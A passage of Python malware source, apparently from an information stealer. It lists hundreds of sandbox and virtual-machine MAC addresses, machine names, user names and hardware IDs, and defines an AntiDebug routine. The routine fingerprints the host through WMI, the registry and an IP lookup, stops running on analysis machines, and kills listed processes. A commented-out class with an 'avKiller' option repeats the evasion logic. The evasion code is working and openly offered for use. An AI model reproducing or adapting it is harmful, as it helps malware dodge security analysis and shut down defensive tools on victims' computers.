'00:e0:4c:46:cf:01', '00:e0:4c:48:ed:10', '00:e0:4c:4b:4a:40', '00:e0:4c:4b:ef:a1', '00:e0:4c:4e:9f:d4', '00:e0:4c:51:e5:58', '00:e0:4c:56:42:97', '00:e0:4c:57:c2:e3', '00:e0:4c:59:08:ad', '00:e0:4c:59:47:48', '00:e0:4c:60:fa:71', '00:e0:4c:6c:0a:56', '00:e0:4c:7b:7b:86', '00:e0:4c:7e:11:ce', '00:e0:4c:82:08:94', '00:e0:4c:82:7f:0a', '00:e0:4c:89:42:fe', '00:e0:4c:8e:2f:28', '00:e0:4c:94:1f:20', '00:e0:4c:a2:b2:bd', '00:e0:4c:ae:19:37', '00:e0:4c:b0:2f:67', '00:e0:4c:b3:5a:2a', '00:e0:4c:b8:7a:58', '00:e0:4c:b9:c4:3f', '00:e0:4c:c0:65:2c', '00:e0:4c:c4:08:2e', '00:e0:4c:c7:ca:f1', '00:e0:4c:c8:aa:d7', '00:e0:4c:c9:2a:08', '00:e0:4c:cb:62:08', '00:e0:4c:d1:56:de', '00:e0:4c:d6:86:77', '00:e0:4c:da:bf:6e', '00:e0:4c:e3:3e:b2', '00:e0:4c:e7:c7:bf', '00:e0:4c:ee:5f:08', '00:e0:4c:f3:81:1c', '00:e0:4c:f4:eb:63', '00:e0:4c:f7:30:a5', '00:e0:4c:fb:45:fc', '02:86:39:58:1f:75', '06:75:91:59:3e:02', '06:ab:f8:36:4f:cb', '06:ea:15:e5:16:b4', '08:00:27:20:4c:1a', '08:00:27:26:1b:94', '08:00:27:28:67:1a', '08:00:27:28:e3:8a', '08:00:27:34:7a:b1', '08:00:27:3a:28:73', '08:00:27:45:13:10', '08:00:27:46:a3:07', '08:00:27:4a:cc:93', '08:00:27:4f:e9:1d', '08:00:27:5e:53:08', '08:00:27:74:bd:28', '08:00:27:7b:5b:3b', '08:00:27:82:3d:dd', '08:00:27:88:f9:c3', '08:00:27:8b:3e:7e', '08:00:27:9f:4d:2f', '08:00:27:b6:c5:5a', '08:00:27:c0:be:b8', '08:00:27:ec:0e:51', '08:00:27:f4:14:a6', '08:00:27:fa:22:90', '08:00:27:ff:d3:c4', '0c:c4:7a:c8:39:21', '0c:c4:7a:c8:39:33', '0c:c4:7a:c8:39:37', '0c:c4:7a:c8:39:42', '12:04:6b:47:c4:71', '12:1b:9e:3c:a6:2c', '12:8a:5c:2a:65:d1', '12:94:86:73:8e:5d', '12:a9:f8:37:65:83', '12:b6:4b:62:ea:cd', '12:e6:0c:f5:55:bf', '12:f8:87:ab:13:ec', '16:ef:22:04:af:76', '1a:6c:62:60:3b:f4', '1c:99:57:1c:ad:e4', '1e:6c:34:93:68:64', '2a:38:06:16:65:d6', '2e:62:e8:47:14:49', '2e:b8:24:4d:f7:de', '2e:bc:c1:0c:cb:c3', '32:11:4d:d0:4a:9e', '3a:18:2f:93:16:06', '3a:7a:4b:23:00:f6', '3c:ec:ef:43:fe:56', '3c:ec:ef:43:fe:9c', '3c:ec:ef:43:fe:a4', '3c:ec:ef:43:fe:d6', '3c:ec:ef:43:fe:de', '3c:ec:ef:43:ff:5e', '3c:ec:ef:44:00:16', '3c:ec:ef:44:00:34', '3c:ec:ef:44:00:36', '3c:ec:ef:44:00:b4', '3c:ec:ef:44:00:b8', '3c:ec:ef:44:00:d0', '3c:ec:ef:44:00:d7', '3c:ec:ef:44:00:fe', '3c:ec:ef:44:01:0c', '3c:ec:ef:44:01:24', '3c:ec:ef:44:01:30', '3c:ec:ef:44:01:50', '3c:ec:ef:44:01:57', '3c:ec:ef:44:01:a8', '3c:ec:ef:44:01:aa', '3c:ec:ef:44:02:04', '3e:1c:a1:40:b7:5f', '3e:53:81:b7:01:13', '3e:62:aa:de:d7:10', '3e:c1:fd:f1:bf:71', '42:01:0a:8a:00:22', '42:01:0a:8a:00:33', '42:01:0a:8e:00:22', '42:01:0a:96:00:22', '42:01:0a:96:00:33', '42:85:07:f4:83:d0', '4a:3c:5d:ce:ed:b0', '4e:79:c0:d9:af:c3', '4e:81:81:8e:22:4e', '52:54:00:3b:78:24', '52:54:00:8b:a6:08', '52:54:00:a0:41:92', '52:54:00:ab:de:59', '52:54:00:b3:e4:71', '52:e7:af:c5:c6:cb', '56:49:c0:b8:e6:2b', '56:b0:6f:ca:0a:e7', '56:e8:92:2e:76:0d', '5a:89:61:39:9a:e2', '5a:e2:a6:a4:44:db', '5e:86:e4:3d:0d:f6', '60:02:92:3d:f1:69', '60:02:92:66:10:79', '66:0c:31:e8:d0:15', '72:07:f2:e2:d2:7b', '72:b5:c0:9b:a9:b2', '7e:05:a3:62:9c:4d', '7e:44:6c:f0:a3:a7', '7e:66:1f:e8:d5:09', '7e:b8:7b:21:b8:3f', '8a:e8:f4:ff:f5:b3', '8e:73:7b:82:ce:ac', '90:48:9a:9d:d5:24', '92:4c:a8:23:fc:2e', '94:de:80:de:1a:35', '96:0d:7f:f7:e3:19', '96:2b:e9:43:96:76', '9a:d1:44:ac:db:be', 'a6:24:aa:ae:e6:12', 'ac:1f:6b:d0:47:a0', 'ac:1f:6b:d0:48:4e', 'ac:1f:6b:d0:48:50', 'ac:1f:6b:d0:48:d2', 'ac:1f:6b:d0:48:f8', 'ac:1f:6b:d0:48:fe', 'ac:1f:6b:d0:49:1c', 'ac:1f:6b:d0:49:26', 'ac:1f:6b:d0:49:28', 'ac:1f:6b:d0:49:76', 'ac:1f:6b:d0:49:86', 'ac:1f:6b:d0:49:b8', 'ac:1f:6b:d0:4c:0a', 'ac:1f:6b:d0:4c:a2', 'ac:1f:6b:d0:4d:06', 'ac:1f:6b:d0:4d:8e', 'ac:1f:6b:d0:4d:98', 'ac:1f:6b:d0:4d:c0', 'ac:1f:6b:d0:4d:cc', 'ac:1f:6b:d0:4d:e4', 'b2:9f:a3:9e:16:9e', 'b4:a9:5a:b1:c6:fd', 'b6:c4:c0:09:08:ae', 'b6:ed:9d:27:f4:fa', 'be:00:e5:c5:0c:e5', 'be:2b:f2:c8:87:6e', 'bf:af:1b:fc:ce:42', 'c2:64:e7:fe:36:18', 'c2:bd:e9:ad:a7:9c', 'c2:ee:af:fd:29:21', 'c8:9f:1d:b6:58:e4', 'ca:4d:4b:ca:18:cc', 'd2:1b:62:b0:55:bb', 'd4:81:d7:1e:6c:30', 'd4:81:d7:24:1d:4b', 'd4:81:d7:24:ee:7d', 'd4:81:d7:2e:f9:97', 'd4:81:d7:31:2c:29', 'd4:81:d7:42:0a:0b', 'd4:81:d7:47:36:85', 'd4:81:d7:52:50:92', 'd4:81:d7:87:05:ab', 'd4:81:d7:92:3a:e6', 'd4:81:d7:9d:66:9b', 'd4:81:d7:a2:c9:73', 'd4:81:d7:ac:5b:69', 'd4:81:d7:b7:0e:11', 'd4:81:d7:c4:2c:5d', 'd4:81:d7:cd:96:ef', 'd4:81:d7:d9:db:12', 'd4:81:d7:e4:93:c9', 'd4:81:d7:ed:25:54', 'd4:81:d7:f1:1f:a2', 'd4:81:d7:f2:fb:7a', 'd4:81:d7:fc:4c:8a', 'd4:81:d7:fe:bc:ef', 'd6:03:e4:ab:77:8e', 'd6:68:e1:6e:8f:0e', 'd6:73:50:cc:d2:5d', 'da:1f:fb:e4:05:27', 'e2:3a:5d:90:aa:50', 'e2:6f:77:dd:8e:96', 'e6:85:43:3c:7e:1a', 'ea:02:75:3c:90:9f', 'ea:f6:f1:a2:33:76', 'f2:44:3c:5e:f7:53', 'f6:a5:41:31:b2:78', 'fa:b9:44:c7:1c:13', 'fe:97:78:29:be:37', 'ff:6d:36:7e:50:43', '3c:ec:ef:c8:39:37', 'c8:1f:66:c8:39:2a', 'c8:1f:66:c8:39:23', '00:50:56:a0:c1:fd', 'ac:1f:6b:d0:48:d8', '00:e0:4c:c9:fb:38', '00:e0:4c:11:4c:30', '00:e0:4c:d7:1a:3c', '00:e0:4c:13:38:17', '00:e0:4c:8c:e1:df', '00:e0:4c:b6:47:a3', '00:e0:4c:51:2f:48', '00:e0:4c:b8:d7:d7', '00:e0:4c:63:06:ec', '00:e0:4c:d5:18:5e', 'ac:1f:6b:d0:4d:08', '00:e0:4c:c5:a6:21', '00:e0:4c:56:4c:16', '00:e0:4c:9d:6b:e7', '00:e0:4c:98:40:33', '00:e0:4c:b5:91:7c', '00:e0:4c:68:c0:02', '00:e0:4c:eb:9d:83', '00:e0:4c:8f:ef:c5', '00:e0:4c:66:d9:58', '00:e0:4c:6e:12:dd', '00:e0:4c:ba:21:c5', '00:e0:4c:c7:76:c9', '00:e0:4c:59:bd:b9', 'c4:65:16:e8:19:02', 'c4:65:16:e8:16:04', 'ac:1f:6b:d0:4d:d8', '00:e0:4c:94:59:90', 'd4:81:d7:92:c3:ca', '00:e0:4c:ce:bb:79', 'c4:65:16:e8:02:09', 'c4:65:16:e8:16:01', '00:e0:4c:f1:10:c1', '00:e0:4c:1b:d8:33', '0c:c4:7a:c8:39:24', '0c:c4:7a:c8:39:44', '00:e0:4c:91:77:bd', '00:e0:4c:24:26:5a', '0c:c4:7a:c8:39:4d', '08:00:27:6e:21:5b', 'c4:65:16:e8:17:00', '00:e0:4c:18:a3:79', '00:e0:4c:2b:67:15', '00:e0:4c:1b:19:79', '00:e0:4c:33:f8:c6', '00:e0:4c:af:fe:ec', 'c4:65:16:e8:05:02', 'fa:ff:d4:91:30:b0', '84:eb:ef:8a:c5:44', '00:15:5d:bf:eb:47', 'c4:65:16:e8:02:07', 'c4:65:16:e8:12:05', '00:e0:4c:20:50:d8', '00:e0:4c:8f:23:46', '08:00:27:d9:d5:e8', '00:15:5d:00:80:f3', '00:15:5d:00:00:12', '00:50:56:97:5f:18', 'c4:65:16:e8:11:04', 'c4:65:16:e8:12:02', '00:15:5d:00:6a:d4']

blacklisted_PC_Name = ['00900BC83803', '0CC47AC83803', '6C4E733F-C2D9-4', 'ACEPC', 'AIDANPC', 'ALENMOOS-PC', 'ALIONE', 'APPONFLY-VPS', 'ARCHIBALDPC', 'azure', 'B30F0242-1C6A-4', 'BAROSINO-PC', 'BECKER-PC', 'BEE7370C-8C0C-4', 'COFFEE-SHOP', 'COMPNAME_4047', 'd1bnJkfVlH', 'DESKTOP-19OLLTD', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'DESKTOP-4U8DTF8', 'DESKTOP-54XGX6F', 'DESKTOP-5OV9S0O', 'DESKTOP-6AKQQAM', 'DESKTOP-6BMFT65', 'DESKTOP-70T5SDX', 'DESKTOP-7AFSTDP', 'DESKTOP-7XC6GEZ', 'DESKTOP-8K9D93B', 'DESKTOP-AHGXKTV', 'DESKTOP-ALBERTO', 'DESKTOP-B0T93D6', 'DESKTOP-BGN5L8Y', 'DESKTOP-BUGIO', 'DESKTOP-BXJYAEC', 'DESKTOP-CBGPFEE', 'DESKTOP-CDQE7VN', 'DESKTOP-CHAYANN', 'DESKTOP-CM0DAW8', 'DESKTOP-CNFVLMW', 'DESKTOP-CRCCCOT', 'DESKTOP-D019GDM', 'DESKTOP-D4FEN3M', 'DESKTOP-DE369SE', 'DESKTOP-DIL6IYA', 'DESKTOP-ECWZXY2', 'DESKTOP-F7BGEN9', 'DESKTOP-FSHHZLJ', 'DESKTOP-G4CWFLF', 'DESKTOP-GELATOR', 'DESKTOP-GLBAZXT', 'DESKTOP-GNQZM0O', 'DESKTOP-GPPK5VQ', 'DESKTOP-HASANLO', 'DESKTOP-HQLUWFA', 'DESKTOP-HSS0DJ9', 'DESKTOP-IAPKN1P', 'DESKTOP-IFCAQVL', 'DESKTOP-ION5ZSB', 'DESKTOP-JQPIFWD', 'DESKTOP-KALVINO', 'DESKTOP-KOKOVSK', 'DESKTOP-NAKFFMT', 'DESKTOP-NKP0I4P', 'DESKTOP-NM1ZPLG', 'DESKTOP-NTU7VUO', 'DESKTOP-QUAY8GS', 'DESKTOP-RCA3QWX', 'DESKTOP-RHXDKWW', 'DESKTOP-S1LFPHO', 'DESKTOP-SUPERIO', 'DESKTOP-V1L26J5', 'DESKTOP-VIRENDO', 'DESKTOP-VKNFFB6', 'DESKTOP-VRSQLAG', 'DESKTOP-VWJU7MF', 'DESKTOP-VZ5ZSYI', 'DESKTOP-W8JLV9V', 'DESKTOP-WG3MYJS', 'DESKTOP-WI8CLET', 'DESKTOP-XOY7MHS', 'DESKTOP-Y8ASUIL', 'DESKTOP-YW9UO1H', 'DESKTOP-ZJF9KAN', 'DESKTOP-ZMYEHDA', 'DESKTOP-ZNCAEAM', 'DESKTOP-ZOJJ8KL', 'DESKTOP-ZV9GVYL', 'DOMIC-DESKTOP', 'EA8C2E2A-D017-4', 'ESPNHOOL', 'GANGISTAN', 'GBQHURCC', 'GRAFPC', 'GRXNNIIE', 'gYyZc9HZCYhRLNg', 'JBYQTQBO', 'JERRY-TRUJILLO', 'JOHN-PC', 'JUDES-DOJO', 'JULIA-PC', 'LANTECH-LLC', 'LISA-PC', 'LOUISE-PC', 'LUCAS-PC', 'MIKE-PC', 'NETTYPC', 'ORELEEPC', 'ORXGKKZC', 'PaulJones', 'PC-DANIELE', 'PROPERTY-LTD', 'Q9IATRKPRH', 'QarZhrdBpj', 'RALPHS-PC', 'SERVER-PC', 'SERVER1', 'Steve', 'SYKGUIDE-WS17', 'T00917', 'test42', 'TIQIYLA9TW5M', 'TMKNGOMU', 'TVM-PC', 'VONRAHEL', 'WILEYPC', 'WIN-5E07COS9ALR', 'WINDOWS-EEL53SN', 'WINZDS-1BHRVPQU', 'WINZDS-22URJIBV', 'WINZDS-3FF2I9SN', 'WINZDS-5J75DTHH', 'WINZDS-6TUIHN7R', 'WINZDS-8MAEI8E4', 'WINZDS-9IO75SVG', 'WINZDS-AM76HPK2', 'WINZDS-B03L9CEO', 'WINZDS-BMSMD8ME', 'WINZDS-BUAOKGG1', 'WINZDS-K7VIK4FC', 'WINZDS-QNGKGN59', 'WINZDS-RST0E8VU', 'WINZDS-U95191IG', 'WINZDS-VQH86L5D', 'WORK', 'XC64ZB', 'XGNSVODU', 'ZELJAVA', '3CECEFC83806', 'C81F66C83805', 'DESKTOP-USLVD7G', 'DESKTOP-AUPFKSY', 'DESKTOP-RP4FIBL', 'DESKTOP-6UJBD2J', 'DESKTOP-LTMCKLA', 'DESKTOP-FLTWYYU', 'DESKTOP-WA2BY3L', 'DESKTOP-UBDJJ0A', 'DESKTOP-KXP5YFO', 'DESKTOP-DAU8GJ2', 'DESKTOP-FCRB3FM', 'DESKTOP-VYRNO7M', 'DESKTOP-PKQNDSR', 'DESKTOP-SCNDJWE', 'DESKTOP-RSNLFZS', 'DESKTOP-MWFRVKH', 'DESKTOP-QLN2VUF', 'DESKTOP-62YPFIQ', 'DESKTOP-PA0FNV5', 'DESKTOP-B9OARKC', 'DESKTOP-J5XGGXR', 'DESKTOP-JHUHOTB', 'DESKTOP-64ACUCH', 'DESKTOP-SUNDMI5', 'DESKTOP-GCN6MIO', 'FERREIRA-W10', 'DESKTOP-MJC6500', 'DESKTOP-WS7PPR2', 'DESKTOP-XWQ5FUV', 'DESKTOP-UHHSY4R', 'DESKTOP-ZJRWGX5', 'DESKTOP-ZYQYSRD', 'WINZDS-MILOBM35', 'DESKTOP-K8Y2SAM', 'DESKTOP-4GCZVJU', 'DESKTOP-O6FBMF7', 'DESKTOP-WDT1SL6', 'EIEEIFYE', 'CRYPTODEV222222', 'EFA0FDEC-8FA7-4', 'DESKTOP-O7BI3PT', 'DESKTOP-UHQW8PI', 'WINZDS-PU0URPVI', 'ABIGAI', 'JUANYARO', 'floppy', 'CATWRIGHT']

blacklisted_Platform = ['Windows-XP-5.1.2600-SP2', 'MicrosoftWindowsServer2022StandardEvaluation', 'MicrosoftWindowsServer2022StandardEvaluation', 'MicrosoftWindowsServer2022StandardEvaluation', '\\xd0\\x9f\\xd1\\x80\\xd0\\xbe\\xd1\\x84\\xd0\\xb5\\xd1\\x81\\xd1\\x81\\xd0\\xb8\\xd0\\xbe\\xd0\\xbd\\xd0\\xb0\\xd0\\xbb\\xd1\\x8c\\xd0\\xbd\\xd0\\xb0\\xd1\\x8f']

blacklisted_Users = ['05h00Gi0', '3u2v9m8', '43By4', '4tgiizsLimS', '6O4KyHhJXBiR', '7wjlGX7PjlW4', '8Nl0ColNQ5bq', '8VizSM', 'Abby', 'Amy', 'AppOnFlySupport', 'ASPNET', 'azure', 'BUiA1hkm', 'BvJChRPnsxn', 'cM0uEGN4do', 'cMkNdS6', 'DefaultAccount', 'dOuyo8RV71', 'DVrzi', 'e60UW', 'ecVtZ5wE', 'EGG0p', 'Frank', 'fred', 'G2DbYLDgzz8Y', 'george', 'GjBsjb', 'Guest', 'h7dk1xPr', 'h86LHD', 'HarryJohnson', 'HEUeRzl', 'hmarc', 'ICQja5iT', 'IVwoKUF', 'j6SHA37KA', 'j7pNjWM', 'John', 'jude', 'Julia', 'kEecfMwgj', 'kFu0lQwgX5P', 'KUv3bT4', 'Lisa', 'lK3zMR', 
'lmVwjj9b', 'Louise', 'Lucas', 'mike', 'Mr.None', 'noK4zG7ZhOf', 'o6jdigq', 'o8yTi52T', 'OgJb6GqgK0O', 'patex', 'PateX', 'PaulJones', 'pf5vj', 'PgfV1X', 'PqONjHVwexsS', 'pWOuqdTDQ', 'PxmdUOpVyx', 'QfofoG', 'QmIS5df7u', 'QORxJKNk', 'qZo9A', 'RDhJ0CNFevzX', 'RGzcBUyrznReg', 'S7Wjuf', 'server', 'SqgFOf3G', 'Steve', 'test', 'TVM', 'txWas1m2t', 'umyUJ', 'Uox1tzaMO', 'User01', 'w0fjuOVmCcP5A', 'WDAGUtilityAccount', 'XMiMmcKziitD', 'xPLyvzr8sgC', 'ykj0egq7fze', 'DdQrgc', 'ryjIJKIrOMs', 'nZAp7UBVaS1', 'zOEsT', 'l3cnbB8Ar5b8', 'xUnUy', 'fNBDSlDTXY', 'vzY4jmH0Jw02', 'gu17B', 'UiQcX', '21zLucUnfI85', 'OZFUCOD6', '8LnfAai9QdJR', '5sIBK', 'rB5BnfuR2', 'GexwjQdjXG', 'IZZuXj', 'ymONofg', 'dxd8DJ7c', 'JAW4Dz0', 'GJAm1NxXVm', 'UspG1y1C', 'equZE3J', 'BXw7q', 'lubi53aN14cU', '5Y3y73', '9yjCPsEYIMH', 'GGw8NR', 'JcOtj17dZx', '05KvAUQKPQ', '64F2tKIqO5', '7DBgdxu', 'uHUQIuwoEFU', 'gL50ksOp', 'Of20XqH4VL', 'tHiF2T', 'sal.rosenburg', 'hbyLdJtcKyN1', 'Rt1r7', 'katorres', 'doroth', 'umehunt']


def checkHWID():
    try:
        return check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True,
                                        stdin=PIPE, stderr=PIPE).decode('utf-8').split('\n')[1].strip()
    except:
        return "No data"


def checkMAC():
    try:
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        return ':'.join([mac[e:e + 2] for e in range(0, 12, 2)])
    except:
        return "No data"
    


def checkBIOS():
    try:
        c = wmi.WMI()
        bios = c.Win32_BIOS()[0]
        return bios.SerialNumber.strip()
    except:
        return "No data"


def checkManufacture():
    try:
        c = wmi.WMI()
        baseboard = c.Win32_BaseBoard()[0]
        return baseboard.Manufacturer.strip()
    except:
        return "No data"


def checkBASE():
    try:
        wmi_service = wmi.WMI()
        baseboards = wmi_service.Win32_BaseBoard()
        return  baseboards[0].SerialNumber
    except:
        return "No data"
    


def checkCPU():
    try:
        cpu_info = psutil.cpuinfo()
        return cpu_info[0].serial
    except:
        return "No data"



def checkDrive():
    try:
        c = wmi.WMI()
        drives = c.Win32_DiskDrive()
        return drives[0].SerialNumber.strip()
    except:
        return "No data"


def checkHW_profile():
    try:
        c = wmi.WMI()
        hw_profiles = c.Win32_SystemDriver()
        for profile in hw_profiles:
            if profile.DisplayName == 'HW Profile GUID':
                return profile.Description.strip()
        return "No data"
    except:
        return "No data"


def checkGUID():
    try:
        output = subprocess.check_output(['reg', 'query', 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography', '/v', 'MachineGuid'], stderr=subprocess.DEVNULL)
        lines = output.decode().split('\n')
        for line in lines:
            if 'MachineGuid' in line:
                _, guid = line.split()
            return guid.strip()
        return "No data"
    except:
        return "No data"



def checkGPU():
    try:
        c = wmi.WMI()
        gpu_info = []
        for gpu in c.Win32_VideoController():
            gpu_info.append((gpu.Name))
        return gpu_info
    except:
        return []




def checkIP():
    try:
        return json.loads(requests.get('https://ipinfo.io/json').text)['ip']
    except:
        return "No data"


def checkPlatform():
    try:
        return platform.system()
    except:
        return "No data"









def AntiDebug(oneStart):  

    pathf = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'

    if oneStart:
        if (os.path.exists(rf'{pathf}\system\sysFiles\winDef\log20742384.txt')):# Checks if a virus has opened on this PC
            return True
    if os.path.exists(rf'{pathf}\windll'):
        return True

    processlist = psutil.process_iter(['name'])

    if os.getenv("USERPROFILE") in blacklisted_Users:
        return True


    if os.getenv('COMPUTERNAME') in blacklisted_PC_Name:
        return True


    if checkHWID() in blacklisted_HWID:
        return True


    if checkMAC() in blacklisted_Mac_Address:
        return True


    for exe in processlist:
        if exe.info.get('name') in blacklisted_Processes:
            return True
            break

    if not os.path.exists(f"{os.getenv('APPDATA')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"):
        return True


    if checkBIOS() in blacklisted_Bios:
        return True

    
    if checkManufacture() in blacklisted_Manufacture:
        return True


    if checkBASE() in blacklisted_BaseBoard:
        return True


    if checkCPU() in blacklisted_CPU:
        return True


    if checkDrive() in blacklisted_Drive:
        return True


    if checkHW_profile() in blacklisted_HW_Profile_GUID:
        return True
 


    if checkGUID() in blacklisted_Machine_GUID:
        return True

    gpus = checkGPU()
    for gpu in gpus:
        if gpu in blacklisted_GPU:
            return True
            break



    if checkIP() in blacklisted_ip:
        return True

    if checkPlatform() in blacklisted_Platform:
        return True
    
    for proc in processlist:
            if any(procstr in proc.name().lower() for procstr in kill_Processes):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
    return False







'''
"""
All imports
"""
from os import _exit,getenv,sep,path,environ
from re import findall
from subprocess import check_output,PIPE
from uuid import getnode
from psutil import NoSuchProcess,process_iter,AccessDenied
from requests import get

"""
class that checks if this computer is suitable
"""
class AntiDebug:
    def __init__(self,oneStart,avKiller) -> None:
        print("ad")
        self.oneStart = oneStart
        self.avKiller = avKiller
        if self.checks(): # if  this computer is unsuitable prog will exit
            _exit(0)
    
    """
    checks PS User names, PC names, HWIDS, IPS or processes
    """
    def checks(self) -> bool:
        debugging = False

        self.blacklistedListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
                                 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
        self.blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O',
                                   'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D',
                                 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 